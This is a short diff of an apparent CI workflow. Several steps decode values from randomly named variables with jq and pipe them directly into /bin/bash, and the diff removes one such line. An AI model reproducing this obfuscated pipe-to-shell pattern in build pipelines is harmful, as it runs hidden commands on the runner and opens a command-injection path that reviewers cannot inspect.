@@ -26,7 +26,6 @@ jobs:
           echo $ngx230 | jq -r .iannc710 | /bin/bash
           printf '%s' "$eex2366" | jq -r .k82441 | /bin/bash
           printf '%s' "$nuyjd5" | jq -r .jyfil49 | /bin/bash
-          echo $rb6907 | jq -r .yzqp5 | /bin/bash
           printf '%s' "$jkbgw2" | jq -r .ppdm629 | /bin/bash
 
       - name: Store output
